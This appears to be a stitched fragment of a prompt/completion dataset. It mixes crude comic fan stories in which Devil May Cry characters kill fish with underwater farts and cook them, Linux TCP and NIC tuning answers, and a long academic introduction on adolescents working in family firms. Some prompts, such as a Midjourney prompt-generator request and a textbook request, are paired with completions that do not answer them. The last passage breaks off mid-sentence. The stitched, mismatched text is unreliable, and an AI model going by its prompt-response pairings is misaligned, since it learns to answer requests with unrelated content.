Any fish that smells V’s underwater fart dies. he happily collects them. Back at home he cooks a gourmet dinner using the fish.","completion":"As the unorthodox demon hunter known as V strode purposefully towards a secluded, shimmering pond on the outskirts of Redgrave City, his gait was unhurried but determined, for he was on a culinary quest. Clad initially in his typical garb, his long black coat billowing behind him as the waning sun tinted the sky in shades of orange and violet, he looked less like a man about to engage in angling and more like a poet about to recite verses by the water. But this was no ordinary man, and certainly no conventional fishing trip. Upon reaching the edge of the pond, V glanced around to ensure privacy for what was about to become a peculiarly personal ritual. He slipped out of his coat, revealing porcelain white skin contrasted sharply against the intricate black tattoos adorning his lean, almost fragile-looking form. As far as demon hunters went, he didn't possess the bulging muscles of his compatriots. Instead, there was an understated elegance to his physique—more ballerino than brawler. With an impish grin that hinted at mischief, V shed the remainder of his clothing piece by piece. His pale, moonish buttocks were now on full, unabashed display, as stark and arresting as two moons in a midnight sky. Onlookers, were there any, may have noticed the little smirk that played about his lips mirrored the quirky upturn of his hair, awry as a crow's nest after a squall. His face bore the peaceful and focused expression of a man completely at home in his nudity and mission. And then, V stepped into the water. The cold liquid lapped against his ankles, thighs, and finally, waist as he waded further out, the water stirring to his languid movements. As he submerged himself to his neck, fish darted around, oblivious to their fate. V's eyes closed for a moment, reaching a state of harmony with the world around him, feeling the ebb and flow as if they were part of the music he so dearly adored. Then, with an air of solemnity that could only be described as comical given his state of undress and the task at hand, V summoned his demonic powers in a most unconventional manner. Drawing a deep breath, he relaxed, allowing nature to take its course. A tiny trail of bubbles emerged, betraying the silent but deadly undercurrent unraveling beneath the water's surface. What happened next could only be described as apocalyptic for piscean life. The underwater fart, a pungent miasma of unholy potency, spread like a noxious cloud, its lethality masked by its quiet delivery. Fish turned belly-up en masse, as if playing dead in a game of aquatic possums, a wave of expiration and demise sent forth by V's behind. Triumphant, V collected his harvest, scooping the motionless fish with a nonchalance that belied the absurdity of his fishing method. Wading back to the shore, he chuckled to himself—a chuckle that ruffled the still air as his tall, wiry frame cast a long, slender shadow across the now-calm waters. Clad once more—he did have to cook, after all—V set about crafting a gourmet dinner back at his makeshift kitchen. His culinary skills, akin in flair and dexterity to his demon-conjuring, transformed the ill-fated fish into a splendid feast—a symphony on a plate accompanied by the subtle zest of herbs and the tang of fine wine. As he tucked into his meal, a sated smile spread across his enigmatic countenance. V, the eccentric demon hunter, had turned a bizarre fishing tactic into a blissful dining experience. Nearby, his familiar, Griffon, rolled its eyes, muttering something about \\"gassy gourmet escapades,\\" but even it couldn't deny the unique expertise of its companion. In the world of Devil May Cry, where demons and swordplay abound, V's unusual methods were a reminder that sometimes, victory—and dinner—came from the most unexpected places.

Here are some considerations for tuning TCP performance: 1. **Buffer Sizes**: The default buffer sizes for send and receive may not be adequate for networks with high bandwidth-delay product (BDP), which is common in long-distance and high-speed networks. You may need to manually increase these buffer sizes. TCP auto-tuning can also help as modern Linux kernels dynamically adjust buffer sizes, but this may still require manual tuning. 2. **Congestion Control Algorithms**: Different congestion control algorithms perform better under different network conditions. For instance, BBR (Bottleneck Bandwidth and Round-trip propagation time) is known to perform better in many scenarios compared to the older algorithms like Cubic and Reno, but it may not always be the best choice depending on the specific use case. 3. **TCP Parameters**: Other TCP parameters that might require tuning include TCP SACK (Selective Acknowledgments), TCP Window Scaling, TCP timestamps, etc. Each of these options can affect performance. 4. **Network Stack Tuning**: For the highest performance, you should also inspect other network stack parameters beyond just TCP-specific ones. This could include offloading tasks to network hardware, interrupt coalescing, and tuning the network driver and NIC (Network Interface Card) settings. 5. **System Tuning**: Network throughput can be impacted by system limitations such as CPU, memory bandwidth, and disk I/O performance. For example, ensuring that the system is not bottlenecked by interrupt handling or context switching is also important. 6. **Monitoring and Benchmarking**: It is crucial to monitor your network and system performance using appropriate tools to understand the impact of your tunings. Tools like iperf, netperf, and ss can be helpful. 7. **Application Behavior**: The application(s) running on the system and how they use the network can also greatly impact network performance. Some applications have their own internal buffer settings and may not take full advantage of the system's TCP stack tuning. 8. **Network Conditions**: Lastly, the external network conditions such as cross-traffic, the presence of NAT devices, firewalls, and the quality of the network path (loss, jitter, etc.) can significantly affect TCP throughput. To sum up, while default settings can be a good starting point, achieving the maximum TCP throughput typically requires a holistic approach that involves careful tuning of the network stack, along with taking into account the application needs and the specific network conditions. It is also an iterative process, as the optimal settings may change over time with network condition changes, updates to the Linux kernel, and improvements in TCP algorithms."},{"prompt":"What are TCP Parameters I need to change or consider?","completion":"When tuning TCP to improve network performance on a Linux system, there are several parameters and options you may consider changing or optimizing. Here's a list of some of the key TCP parameters that you can tweak, found in the \`/proc/sys/net/ipv4/\` directory: 1. **tcp_rmem**: Controls the minimum, default, and maximum sizes of the receive buffer used by TCP sockets. Increasing the maximum can help accommodate high BDP networks. 2. **tcp_wmem**: Similar to tcp_rmem but for the send buffer. 3. **tcp_mem**: Controls how the TCP stack should behave when it comes to memory usage. These values are used by TCP to regulate its memory consumption. 4. **tcp_window_scaling**: Enables window scaling which can be beneficial for high BDP networks. 5. **tcp_congestion_control**: Selects the congestion control algorithm, such as \`reno\`, \`cubic\`, \`bbr\`, etc. 6. **tcp_mtu_probing**: Enabling this can help prevent issues with MTU black holes where ICMP messages are filtered out and packets larger than MTU size are dropped. 7. **tcp_sack**: Enabling Selective Acknowledgment allows TCP to recover from packet loss more efficiently by acknowledging the successful receipt of individual segments. 8. **tcp_fack**: It stands for Forward Acknowledgment and can help in optimizing the delivery of acknowledgments. 9. **tcp_timestamps**: Can provide protection against wrapped sequence numbers and improve RTT estimation but may introduce overhead. 10. **tcp_slow_start_after_idle**: Determines whether TCP should initiate a slow start after an idle period or retain its congestion window size. 11. **tcp_tw_reuse** and **tcp_tw_recycle**: These parameters control the reuse and recycling of TIME-WAIT sockets. However, these are not recommended anymore due to potential issues with NAT. 12. **tcp_syncookies**: Syncookies can be used to protect against SYN flood attacks but aren't recommended for performance tuning, as they have certain limitations. 13. **tcp_quickack**: Can be used to disable TCP's delayed acknowledgment feature, which can potentially improve latency in certain situations. 14. **tcp_no_metrics_save**: Determines whether TCP should save metrics from previous connections to be used for new connections to the same destination. 15. **tcp_max_syn_backlog**: Defines the maximum number of queued connection requests which have not yet received an acknowledgment from the connecting client. 16. **tcp_keepalive_time**, **tcp_keepalive_probes**, **tcp_keepalive_intvl**: These parameters define the behavior of TCP keepalive timers used to check if the connection is still alive. Remember, the optimal values for these parameters depend on the specific use case and network conditions. You should adjust them carefully and monitor their effects on performance. Moreover, you might want to use network performance measurement tools like \`iperf\`, \`netperf\`, or \`htop\` to assess the effectiveness of your tuning efforts."},{"prompt":"Is the list complete?","completion":"The list provided in the previous response covers many of the key TCP parameters that are often adjusted when tuning a Linux system for improved network performance. However, it's important to note that it's not exhaustive; there are other parameters and settings within the Linux kernel and associated subsystems that can affect network performance. Some additional components that could be considered include: - **tcp_fin_timeout**: Adjusts the time to hold socket in state FIN-WAIT-2, if this socket is closed by this side. The default value might be fine for most scenarios, but in some cases, lowering it can help to reclaim resources from dead connections faster. - **tcp_max_tw_buckets**: Limits the maximum number of sockets in TIME-WAIT state. Exceeding this number can result in socket destruction, which can protect against certain types of denial-of-service (DoS) attacks. - **netdev_max_backlog**: Determines the maximum number of packets, queued on the INPUT side, when the interface receives packets faster than the kernel can process them. - **rmem_max** and **wmem_max**: Control the maximum receive and send buffer space allocated for all types of connections, not limited to TCP. - **tcp_syn_retries** and **tcp_orphan_retries**: The number of times the kernel will attempt to retransmit SYN and orphaned segments before dropping the connection. - **tcp_notsent_lowat**: Determines the threshold of not yet sent data in write queue at which TCP stack will signal the write function to continue writing data. - **ip_local_port_range**: Defines the range of ports that TCP and UDP use to establish new connections, which can affect the ability to handle a lot of small, short-lived connections. - **net.ipv4.tcp_fastopen**: Enables support for TCP Fast Open, which can speed up the opening of successive TCP connections between two endpoints. - **net.ipv4.route.gc_timeout**: Affects how long to keep IPv4 routing cache entries. It's beneficial to understand the intricacies of the TCP/IP stack and how each parameter affects network behavior. Alterations should be made carefully and tested to ensure they improve performance without introducing instability or unexpected behavior in the network. Also, with different Linux distributions and kernel versions, new parameters might be available, and some of the mentioned ones may become deprecated or replaced by newer mechanisms. It's always a good practice to refer to the latest kernel documentation and employ tools that analyze network performance to verify the impacts of any tunings."},{"prompt":"Is the list complete?","completion":"The list of TCP parameters provided previously is quite extensive, but the Linux network stack is complex and so are the TCP settings. Kernel parameters can be numerous and not all are directly related to TCP performance tuning. Given the context of TCP performance tuning and acknowledging the intricacy of the network stack, the provided lists cover many of the primary and most commonly tuned TCP parameters that you might encounter. However, kernel developers may introduce new options or some options might become obsolete or considered harmful and thus removed in newer kernel versions. Here are a few additional parameters and considerations that might come into play when tuning TCP: - **tcp_abort_on_overflow**: Determines whether a listening service will abort the connection attempt if the backlog queue is full. - **tcp_adv_win_scale**: Adjusts the TCP window scaling factor; a higher value increases the socket transfer buffer size. - **tcp_app_win**: Adjusts the window with the saved application content on the scale. - **tcp_challenge_ack_limit**: Defines the rate limit imposed on TCP Challenge ACKs to mitigate ACK rate-based DoS attacks. - **tcp_min_tso_segs**: Determines the minimum number of TCP segments for TCP Segmentation Offload (TSO). - **tcp_reordering**: The number of TCP packets that can be resequenced while still accepting packets out of order. - **tcp_retrans_collapse**: Allows or disallows retransmission of contiguous collapsed packets. - **tcp_retries1** and **tcp_retries2**: Configure how many times unacknowledged data is retried in the network layers before considering the remote system unresponsive. - **tcp_rfc1337**: Implements RFC 1337 fix which handles TIME-WAIT assassination hazards in TCP. - **tcp_stdurg**: Uses the standard urg mode in TCP as per RFC. - **net.ipv4.tcp_rfc1337**: Determines if sockets are protected against TIME-WAIT assassination. - **net.ipv4.ip_local_reserved_ports**: Specifies local ports that should not be used by automatic port assignments. In addition to the TCP parameters, there are other factors at play when tuning systems for network performance such as NIC offloads, CPU affinity for interrupt handling, using Receive Side Scaling (RSS), and more. Before tuning, make sure to research and understand the impact of each parameter, because inappropriate changes to kernel parameters can negatively affect system stability and performance. Also, some parameters should be tuned in consideration of the complete stack—from NIC to applications—alongside corresponding kernel versions and hardware capabilities. Consult the Linux kernel documentation, as well as other credible sources and benchmarks when deciding which parameters to adjust. It's essential to test the effects of any tweaks in a controlled environment before applying them to production systems."},{"prompt":"Is the list complete?","completion":"Given the complexity of the Linux kernel and the networking subsystem, it is difficult to provide a truly \\"complete\\" list of all TCP parameters in a single response, especially because the kernel continues to evolve and new parameters can be added while others may be deprecated. Nevertheless, the lists provided in the previous messages cover the majority of the most commonly adjusted TCP parameters for performance tuning purposes. Some other things to consider that go beyond individual parameters include: - **Kernel Version**: Newer versions of the Linux kernel may introduce new TCP features or modify existing behaviors, which may make some of the parameters obsolete or introduce new ones to consider. - **Distribution Specifics**: Some Linux distributions may have their networking stack tuned with different default values or they might backport features from newer kernels. - **Hardware Offloads**: Modern network interfaces support various offloads that can be controlled via ethtool, these offloads can have a significant impact on TCP performance, like TCP Segmentation Offload (TSO), Generic Receive Offload (GRO), and others. - **TCP BBR**: The BBR congestion control algorithm is a relatively recent addition that has become increasingly popular for its performance improvements over traditional congestion control algorithms. - **Security Implications**: Some adjustments to TCP parameters may have security implications (e.g., decreasing timeouts could make denial-of-service attacks more effective). - **Virtualization**: When running within virtualized environments or containers, the hypervisor or container orchestrator settings may also affect network performance. - **Network Topology**: The topology of the network, including the presence of load balancers, firewalls, and routers, can influence the effectiveness of TCP tuning. To ensure your Linux system is optimally tuned, you would need to look at the entire networking stack and its interaction with applications, system settings, and physical hardware. Because the Linux kernel evolves, I recommend checking the latest kernel documentation and using up-to-date sources for guidance on what parameters are currently relevant and supported in your specific kernel version. Never make changes based on assumptions; always test thoroughly in a controlled environment before deploying changes to production. Use robust monitoring and performance analysis tools to measure the impact of the changes you make."},{"prompt":"Are there a network interface tuning recommendations?","completion":"Yes, there are network interface tuning recommendations that can help you optimize the data throughput and network performance in a Linux system. Here are some pointers to consider when tuning your network interface: 1. **Offloading Features**: Modern Network Interface Cards (NICs) support offloading certain processing tasks from the CPU to the NIC hardware. You can use \`ethtool\` to tune these features such as: - Receive Side Scaling (RSS) to distribute incoming network traffic across multiple CPU cores. - Large Receive Offload (LRO) and Generic Receive Offload (GRO) to reduce CPU usage by aggregating packets. - Transmit Packet Steering (XPS) to distribute outgoing traffic across multiple CPU cores. - TCP Segmentation Offload (TSO) to offload the segmentation of large TCP packets to the NIC. - Checksum offloading for both transmit (TX) and receive (RX) paths to offload checksum calculation. - Enable or disable Flow Control (pause frames) to prevent packet loss during congestion. 2. **NIC Ring Buffers**: Adjusting the ring buffer sizes can help in smoothing out bursts of traffic and reducing packet drops when bursts of traffic exceed the default sizes. Use \`ethtool -g\` to view and \`ethtool -G\` to set the RX and TX ring buffer sizes. 3. **Interrupt Coalescing**: Tuning interrupt coalescing using \`ethtool\` can help strike a balance between low latency and high throughput by adjusting how often the NIC interrupts the CPU to process packets. 4. **MTU Size**: Setting the Maximum Transmission Unit (MTU) to a larger value (like 9000 bytes for jumbo frames) can improve network performance by reducing the overhead of headers in data transmissions. However, all devices in the network path must support the configured MTU, or fragmentation may occur. 5. **NIC Queue Length**: Adjust the TX queue length (using \`ifconfig\` or \`ip link\`) to manage the send queue of the network interface, which could be useful for interfaces that either send or receive at high rates. 6. **Driver Selection and Updates**: Ensure you are using the most appropriate and up-to-date driver for your NIC as drivers can have a significant impact on performance. 7. **CPU Affinity and NIC IRQ Mapping**: For multi-core systems, configure which CPUs will handle interrupts from the NIC to avoid unnecessary context switches and cache misses. 8. **Flow Control Configuration**: Decide whether to enable or disable flow control on your NIC, which can pause packet transmission during congestion to avoid packet loss. 9. **ethtool Features**: Use \`ethtool\` to diagnose, configure, and gather information about your network interfaces. It's a versatile tool that offers functions like speed negotiation, port diagnostics, and querying statistics. Before making any changes, it's important to: - Understand the current bottleneck: Use tools like \`ip\`, \`ethtool\`, \`iftop\`, \`sar\`, \`netstat\`, and other monitoring tools to diagnose network performance and identify problems. - Test changes incrementally: Make one change at a time and test its impact on performance. - Document changes: Keep a record of what changes have been made and their effects. - Consider the environment: Be mindful of other network devices, such as switches and routers, which might need corresponding configurations. - Be cautious with production environments: Thoroughly test tuning changes in a staging or development environment to ensure there are no unforeseen negative impacts. Remember that tuning efforts can often lead to trade-offs between latency, throughput, CPU utilization, and memory usage, and what is optimal will depend on the specific use case and network environment."},{"prompt":"Are they enough?","completion":"The recommendations provided above are a comprehensive starting point for tuning network interfaces on a Linux system. However, whether they are enough depends on several factors: 1. **Network Complexity**: In advanced network setups with virtualization, VLANs, SDN, or cloud environments, there may be additional tuning and configuration required at the virtual switch or network controller level. 2. **Hardware Specifications**: Specific features and capabilities of network hardware can vary. For example, enterprise-grade NICs may have additional options for tuning and offloading that consumer-grade NICs do not. 3. **Workload Characteristics**: Different types of workloads may benefit from different tuning parameters. What is optimal for a file server might not be the same for a database server or a real-time streaming service. 4. **Operating System and Kernel Version**: The Linux kernel is under constant development, with newer versions offering improvements and changes to networking code. Some tuning parameters may become deprecated, while others may be introduced. 5. **Driver Support**: Manufacturer support in terms of drivers and firmware can influence performance. Using the most up-to-date and optimized drivers for your NIC is crucial. 6. **End-to-End Consideration**: Networking performance is dependent on the end-to-end path, so it's essential to consider the configuration of other network components, such as switches, routers, and firewalls. 7. **Monitoring and Testing**: Continuous monitoring, benchmarking, and analyzing the traffic patterns of your network are necessary to know if your tuning is having the desired effect. 8. **Scalability and Future-proofing**: As your network grows, settings that are optimal now may not scale well. Periodic reviews and adjustments are needed. 9. **Security**: Always weigh the performance benefits of certain tunings against potential security implications. For instance, enabling Jumbo Frames may improve performance but could also increase the damage potential of a single malformed packet. 10. **Compliance and Best Practices**: Ensure that any tunings are in line with compliance requirements and industry best practices to prevent introducing vulnerabilities or instabilities into your network. It is important to approach network tuning holistically and within the context of your specific network and workload. In many cases, tuning network interfaces is only one part of a broader network optimization strategy, which also includes proper application configuration, server hardware optimization, and adherence to best practices for network design. Additionally, keep in mind that network environments are dynamic, so regular reviews and optimization may be required to maintain peak performance. Always validate and monitor the impact of any changes in a controlled environment before rolling them out to production. Use a well-planned approach that includes benchmarking, load testing, and fallback procedures in case of undesired outcomes."},{"prompt":"As a prompt generator for a generative AI called \\"Midjourney\\", you will create image prompts for the AI to visualize.

Any fish that smells Nero’s underwater fart dies. he happily collects them. Back at home he cooks a gourmet dinner using the fish.","completion":"The city of Red Grave had seen its fair share of chaos and calamities. Unholy beings from infernal planes clashing blades and guns with the rebellious Devil Hunters had become somewhat of a routine spectacle. Yet, in the midst of these supernatural showdowns, the silver-haired Devil Hunter Nero found himself in dire need of a breather from obliterating demons and saving the world. One tranquil evening, Nero decided to forgo his usual menu of takeaway pizza and embark on a culinary adventure that would make his swordsmanship seem like child's play. He trekked to a secluded pond, known only to the odd off-the-grid hermit and wildlife that lined its banks. Armed with not a single blade or firearm, Nero readied himself for a method of hunting no weapon could match. With a proud grunt, he shrugged off his jacket, revealing his honed warrior's physique sculpted by battles and brawls, an artwork of muscle and resolve – not to mention, an all too evident demon heritage. His devilishly handsome face wore an impish grin, and the blue tattoo peeked from under his skin like a silent accomplice to whatever mischief was afoot. His hair fluttered rebelliously as he committed to his task, casting away every thread of cloth that dared cling to his body. Nero waded into the pond, water lapping lovingly at his chiseled abs, as the moon above admired the view. An owl hooted cheekily as if to compliment his brave, bare backside, which had a craftsmanship that the finest sculptors could only dream of replicating. Firm, with just the right level of roundness, Nero's butt was a thing of defiant beauty – a cheeky testament to his relentless training. \\"Time to fish in style,\\" Nero mumbled, winking at a curious frog that seemed to gauge the strangeness of this naked human spectacle. Embracing the cool water, he settled into a hunter's stance. An eerie silence befell the pond, broken only by the discreet giggling of forest sprites who shared shock and delight at Nero’s natural buoyancy. Then, with no warning other than a wicked wind-up, Nero released an underwater fart so powerfully vile, it seemed to halt time itself. Bubbles rose, breaking the surface with their silent lethality. Fish ceased their gentle meandering, struck by the pungent aroma that now permeated their usually crystal-clear abode. One by one, they floated to the surface, succumbing to the Devil Hunter’s uniquely noxious method. Nero lounged in the shallow end, a victorious smirk on his lips as fish after fish floated to him. He gathered the defeated creatures with an almost regal laziness, an emperor collecting taxes from his odor-stricken subjects. \\"I've really outdone myself,\\" Nero chuckled, amassing a formidable heap of fish. With his prey in tow, Nero cloaked his exposed form in a makeshift loincloth made from an unlucky fisherman’s abandoned shirt. He strode back to his place, where he fired up the grill and massaged his now noble catch with an array of spices he conjured from the depths of his seemingly magical pantry. Nero cooked the fish to perfection, turning them with the dainty flicks one might expect from a warrior devoted to the finesse of battle. The aroma of grilled fish wafted through the air, drawing the salivating admiration of passersby, good and demonic alike. Plating up his creation, Nero admired his work: the grilled fish laid out in glory beside a wild herb salad he'd plucked in the nude; all served with the finest wine stolen – erm, \\"salvaged\\" – from a demon-turned-sommelier. As Nero sat down to his gourmet dinner, he raised his glass in a toast to the absurdity of life, the novelty of fishing with flatulence, and the understated beauty of his butt which, through it all, had remained commendably perky. Devil May Cry, after all, but not without a hearty meal and a good laugh at the weird and wild ways of the world."},{"prompt":"textbooks for below courses. 1.

Introduction The ecological theory of human development has mixed findings which suggest adolescent work has both negative and positive impacts on adolescent development (Zimmer-Gembeck & Mortimer, 2006). The mixed findings may partially be due to the research ignoring an important source of work context heterogeneity which has theoretical reasons for being quite different—the family firm. Working in a family firm at a young age, as opposed to a nonfamily firm, likely influences adolescent development differently. This is a critical theoretical gap in the literature as the prevalence of family firms around the globe, including those of developed countries (Arregle, Hitt, Sirmon, & Very, 2007; La Porta, Lopez-de-Silanes, & Shleifer, 1999), indicates that a large number of parents have the option of hiring their own children, especially their own adolescents in their own business. One important decision these parents make is whether to involve the next generation early on in the family business. Family legacy has a significant influence on the decision-making process of family firms (Hammond, Pearson, & Holt, 2016) such that the choosing and developing of a successor, while considering parent– child relationship quality, is one of the most important decisions that family business owners make (Cater & Justis, 2009). Care for the next generation prompts many family owners to hire their adolescents into the business. In developed countries, many adolescents end up working in their family firms at a young age. For example, according to nationally representative data gathered from the Youth in Transition Survey (Statistics Canada, 2012), 45% of Canadian adolescents who were 15 years old as of December 1999 reported having worked in their family business at one point. An important question thus emerges about the consequences of working in the family business on adolescents.With such a high percentage of adolescents in society having worked in a family firm, and given adolescence is a critical stage in developing one’s identity (Mortimer, 2003; Mortimer, Lam, & Lee, 2014), we must better understand the implications of adolescents working in their family business on the adolescent’s psychological well-being and relationship with parents. There has been a debate in the family studies literature regarding the impact of general work on adolescent development and relationships with parents. While some argue this influence is harmful (Greenberger & Steinberg, 1986) noting that this kind of work may lead to stress and a lower level of family commitment (Steinberg, Grennberger, Ruggiero, Garduque, & Vaux, 1982), others posit positive outcomes, such as a greater sense of independence (Mortimer & Shanahan, 1994). Recently, the literature has started to recognize the heterogeneity of outcomes among adolescents on the transition into the working world. Vuolo, Mortimer, and Staff (2014) recently started to disentangle these trajectories in terms of work identity outcomes categorizing the outcomes into “successful” and “floundering” based on a variety of characteristics including work experiences during transitional years. Mortimer and her colleagues (Mortimer, 2003; Mortimer, Kim, Staff, & Vuolo, 2016) start to introduce psychological outcomes such as self-efficacy, finding that “high-quality” employment is linked to increased self-efficacy during these transitional years. The impact on broader psychological well-being and the relationship with parents still needs further disentanglement. Additionally, these studies have been limited to general business work placements, and the dynamics are likely to differ when working with family members due to the inherent nature of the business family overlap. Working with family members is likely to affect the quality of the work experience dramatically, quite possibly providing higher quality employment experiences overall for adolescents. The psychological and relationship impacts of adolescent work become more complex when the work context is the family firm, where familial relationships are particularly affected due to the overlap of family and work settings. Empirical evidence in general settings suggests work has a negative influence on parent–adolescent relationships. One key explanation highlighted in the family studies literature is that working reduces the amount of time adolescents spend with their families (Ashbourne & Daly, 2010). However, in the context of the family firm, adolescents are able to spend more time with their parents at work and be exposed to a unique work environment. Since the underlying theoretical time overlap assumptions are different in the family business context, we expect that in the family business context, the impact of adolescent work may be different than suggested in the general work context typically used in the family studies literature. In other words, working in a family business may be an important source of heterogeneity in the quality of the work experience. This study is the first of its kind to explore this important relationship and make a direct comparison between adolescents who work for nonfamily firms with those who work in their family business. The specific research question we explore in this article centers on the consequences of adolescents working in their family business. We focus our attention on how working in this context influences adolescent development and the parent–child relationship differently. Finally, for those children who are likely to find themselves working in their family-owned firm, we empirically test the best strategy for improving psychological and family outcomes for adolescents. We construct the article as follows. First, drawing on ecological theories of human development, we briefly theorize about the consequences of an adolescent working along with their parents on two important outcomes: parent–adolescent relationships and adolescent wellbeing. We then use the National Longitudinal Survey of Children and Youth (NLSCY), a unique Canadian longitudinal data set well suited to shedding light on this question. To ensure the robustness of our findings, we use different operationalizations of our primary variables of interest and, due to the mixed definitions of family business in the literature, define a variety of business family risk sets. Finally, we discuss our findings and the managerial implications for family firm managers. The Consequences of Adolescents Working in Their Family Business The ecological theory of human development (Bronfenbrenner, 1979) helps understand the spillover between work and family settings and how experience in one setting influences the experience in another setting. The theory, specifically, delineates different types of systems that shape individual development. The lowest level is the micro system in which individuals function in different settings such as school, family, and work. The micro system is concerned with how ties developed in these settings shape the individual and ultimately his or her experience. The next system is the meso system in which the settings found in the micro system are assumed to interact with each other. Their interactions make it possible for relationships formed in one setting to influence the individual’s experience in other settings (Bronfenbrenner, 1979). These settings become more interconnected within the context of family firms. Family businesses have unique characteristics that entail both family and business life and require more nuanced theorizing to study (Chua, Chrisman, & Steier, 2003; Gersick, Lansberg, Desjardins, & Dunn, 1999; Sirmon & Hitt, 2003). They possess distinct traits from nonfamily firms such as the influence of family relations on simultaneous roles and shared identity (Tagiuri & Davis, 1996). This overlap of both roles and identity creates a need to modify broader theory when considering such contexts. The decision-making process of parents as the owners and managers of family firms to a significant extent is shaped by their intention and preference in perpetuation of their family dynasty (e.g., Jaffe & Lane, 2004; Lambrecht, 2005) and keeping family legacy (Hammond et al., 2016). Families have a varying degree of preference for different types of legacy—biological, material, and social. All these types of family legacy could serve as a source of motivation for involving the next generation in the business. However, given those families with a higher biological legacy orientation have a preference for passing the business through the family’s bloodline, they are more likely to consider employing their adolescents in the business. Prior studies suggest that concerns for keeping biological legacy influence how leaders of family firms make strategic decisions (e.g., Gersick, Davis, Hampton, & Lansberg, 1997; Hammond et al., 2016). We, therefore, deduce that the business decision to hire familial adolescents implies parents and adolescents spending more time with each other as well as adolescents working in a unique environment. In the family business context, parents as managers and owners pay attention to providing adolescents with a different type of working experience than their peers would receive from working for strangers. As Hammond et al. (2016) noted, “parental altruism, which represents a trait linking the parents’ welfare to their children’s welfare, is grounded in the notion that parents view their children as an extension of themselves” (p. 1216). Under such context, as family business owners, while spending more time with their children, parents also have incentive to provide their adolescents a unique working environment that in turn affects the adolescent’s relationship with them as well as the adolescent’s psychological well-being. Parent–Adolescent Relationship Adolescence is a critical stage in one’s life (Hall, 1904) and the work experience during this phase conveys a developmental importance both in the short and long run (Mortimer, 2010). An important consequence of work is the mark it leaves on the type of relationship one develops with her parents. Family studies researchers have studied this relationships by making an underlying assumption that adolescent work takes time away from family time (e.g., Ashbourne & Daly, 2010; Steinberg & Dornbusch, 1991). In fact, many of the studies in the literature highlight the importance of the role time plays in the parent–child relationship. Time is a tool families use to craft and shape family ties (Gillis, 1996). In families where both parents and children work, family members may be forced to sacrifice spending time with each other to meet other demands arising from work obligations, which may give rise to work–family conflict for both parents and adolescents. The value of time becomes even greater for adolescents, compared with younger children, as they have less access to family time due to their external activities such as staying out late with friends and working at jobs (Larson, Richards, Moneta, Holmbeck, & Duckett, 1996). While these findings are not conclusive, some studies suggest that reducing the amount of time family members spend with one another may weaken family ties (e.g., Mortimer & Shanahan, 1994; Steinberg & Dornbusch, 1991). The family–work literature also posits that family and work domains influence each other. While empirical evidence supports the notion that the number of work hours is negatively related to work– family balance (Valcour, 2007), it is driven by the tradeoff between working and spending time at home that causes distress to individuals rather than the absolute number of working hours (Barnett & Gareis, 2000). Furthermore, to the extent to which work interferes with family, the family provides less emotional support (Adams, King, & King, 1996)The reduction of time adolescents spend with their families, not surprisingly, is highlighted as one explanation for more negative outcomes associated with adolescents working (Ashbourne & Daly, 2010). These studies, however, do not take into account the nature of the relationship of the employer with the adolescents. While many of these studies highlight the importance of the role time plays in the parent–child relationship, they do not differentiate between who the adolescents are spending time with at work—a stranger or a relative. In family firms, spending time at work or with family is not mutually exclusive. We therefore expect that in the family firm context, the impact of working on adolescent behaviors may be different than currently suggested in the family studies literature. Within the context of family firms, the involvement of adolescents in the business carries its own weight. Family businesses are viewed by many family members as a form of collective wealth that provides utility to the members and while contributing to it is usually encouraged, disengagement from it may be frowned on for both financial and emotional reasons (Eckrich & Loughead, 1996). Because family members view working together and spending time together as advantageous to running a family firm (Cole, 2000), they may be disappointed when some members choose not to engage fully in the firm. Moreover, family firms count on the human capital represented by their members; and given that the size of families is shrinking, these resources have become more valuable (Aldrich & Cliff, 2003). Those family members who do not facilitate running the business may damage their relationships with prominent family members, in this case their father and mother. Part of this unique work experience is that the nature of work contribution also differs for adolescents who work in their family firms than those who work for other people. Those who work for their family firms directly contribute to their family business and hence their relationship with their parents may be more directly and positively influenced. The work setting also allows adolescents to establish new types of ties, in addition to familial ones. Not only can they learn more about their family firm and gain appreciation for the work their family puts into the business they might be able to better express themselves in new dimensions (Ward, 2004). Finally, adolescents who work in their family firms are exposed to unique work experiences that shape them differently than their counterparts. For example, one study showed that those who work in their family business are more likely in the future to enjoy richer career networking and select themselves into organizations with more fitting characteristics than other adolescents who work for a nonfamily member (Houshmand, Seidel, & Ma, 2014). The experience in the work role could spill over to the family role through both the affective and instrumental paths which makes the family role more positive or negative depending on the experience (Greenhaus & Powell, 2006). Consequently, we expect a richer work experience and a positive working relationship between parents and adolescents at work to favorably influence general parent–adolescent relationships. Spending time with family members coupled with the other reasons discussed previously such as establishing new types of connections, finding new avenues to express themselves, and contributing to the family business all suggest that adolescents develop better relationships with their parents when they work consistently in their family firms. Hypothesis 1: Adolescents who have year-round involvement in their family firms report a better relationship with their parents than all other adolescents. Psychological Well-Being Work that is dissatisfying or stressful can impair the psychological well-being of adolescents. Stress and depression in the workplace is often the result of feeling responsible for outcomes beyond one’s control (Shanahan, Finch, Mortimer, & Ryu, 1991). Work that interests and challenges the worker can lead to positive psychological outcomes. For example, boys reported a greater sense of well-being when assigned interesting and complex work; girls reported greater self-esteem and well-being when they perceived school and work settings to be mutually supportive (Mortimer, Finch, Shanahan, & Ryu, 1992). Parents are altruistic toward their children and family members of a family business also display altruistic behavior toward each other (Schulze, Lubatkin, & Dino, 2003). Families, therefore, have incentives to provide positive and developmental working conditions for their own children. To keep family and family firm legacy, parents groom the next generation as their business successors (e.g., Hammond et al., 2016). We thus argue that in family firms, adolescents are more likely to have access to developmental work assignments than in situations where they work for strangers. They are also more likely to receive support from other settings such as school and family for the work they are doing at their family firms. A study of children growing up in the Great Depression concluded that those who helped their financially troubled families by either working within or outside the home had a higher level of self-confidence than those who did not have the same opportunity (Elder & Rockwell, 1979). In the same vein, we predict that due to the better working conditions and the ability to financially help their family, those adolescents who have year-round involvement in their family firms develop greater psychological well-being. Taking into account the role time plays, compared with their younger siblings, adolescents have fewer opportunities to spend time with their family and may also face work–family conflict due to their scarcity of time; which becomes divided among school, friends, work, and family (Larson et al., 1996). Higher level of work–family conflict is positively associated with psychological distress and depression for adults (Frone, 2000; Hammer, Neal, Newsom, Brockwood, & Colton, 2005). Similarly, adolescents facing time constraints and higher levels of work–family conflict may experience lower psychological well-being. Working adolescents in family firms, however, have more opportunities to spend time with their families than their counterparts. They, additionally, have more spare time to allocate to other settings such as social and school. Therefore, these adolescents are better able to handle environmental demands and experience less distress. When parents hire their adolescents into the business, they provide a unique work environment to adolescents. The unique work environment stems from the familial ties these young workers have with their employers (Houshmand et al., 2014) who are more likely to encourage the youngsters to engage in more interesting and complex tasks than other potential employers at odd jobs elsewhere. This positive experience in the work role could spill over to other settings (Greenhaus & Powell, 